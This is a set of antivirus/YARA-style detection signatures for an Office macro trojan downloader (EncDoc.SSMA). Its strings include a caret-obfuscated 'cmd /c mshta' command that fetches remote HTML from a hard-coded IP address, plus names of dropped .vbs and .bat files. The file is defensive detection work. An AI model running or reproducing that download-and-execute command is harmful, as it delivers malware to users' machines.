
rule TrojanDownloader_O97M_EncDoc_SSMA_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SSMA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 38 37 2e 32 35 31 2e 38 36 2e 31 37 38 2f 70 70 2f 6f 6f 2e 68 74 6d 6c } //1 cmd /c m^sh^t^a h^tt^p^:/^/87.251.86.178/pp/oo.html
		$a_01_1 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 38 37 2e 32 35 31 2e 38 36 2e 31 37 38 2f 70 70 2f 61 61 2e 68 74 6d 6c } //1 cmd /c m^sh^t^a h^tt^p^:/^/87.251.86.178/pp/aa.html
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_EncDoc_SSMA_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SSMA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_03_0 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-30] 29 20 2b 20 [0-25] 20 2b 20 22 5c 90 17 04 0f 09 08 04 64 65 66 69 6e 69 74 65 6c 79 64 65 73 74 69 74 75 74 65 64 65 66 69 6e 69 74 65 64 65 65 70 2e 6c 6e 6b 22 } //2
		$a_03_1 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-30] 29 20 26 20 [0-25] 20 2b 20 22 5c (64 65 64 75 63 74 69 6f 6e|64 65 66 65 6e 73 65) 2e 6c 6e 6b 22 } //2
	condition:
		((#a_03_0  & 1)*2+(#a_03_1  & 1)*2) >=2
 
}
rule TrojanDownloader_O97M_EncDoc_SSMA_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SSMA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 05 00 00 "
		
	strings :
		$a_01_0 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 4a 44 52 44 51 59 76 58 53 6b 47 59 59 4a 48 4c 59 6d 76 2e 76 62 73 } //1 C:\ProgramData\JDRDQYvXSkGYYJHLYmv.vbs
		$a_01_1 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 65 57 74 4c 76 50 6f 5a 6f 71 4a 6e 54 44 6c 41 2e 76 62 73 } //1 C:\ProgramData\eWtLvPoZoqJnTDlA.vbs
		$a_01_2 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 66 4b 77 41 55 4e 4e 4e 7a 4e 47 2e 76 62 73 } //1 C:\ProgramData\fKwAUNNNzNG.vbs
		$a_01_3 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 76 68 41 45 58 76 6d 4d 72 6c 79 46 52 4a 79 73 79 41 77 51 2e 76 62 73 } //1 C:\ProgramData\vhAEXvmMrlyFRJysyAwQ.vbs
		$a_01_4 = {63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 69 68 6f 66 62 6e 6d 2e 62 61 74 } //1 c:\programdata\ihofbnm.bat
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=1
 
}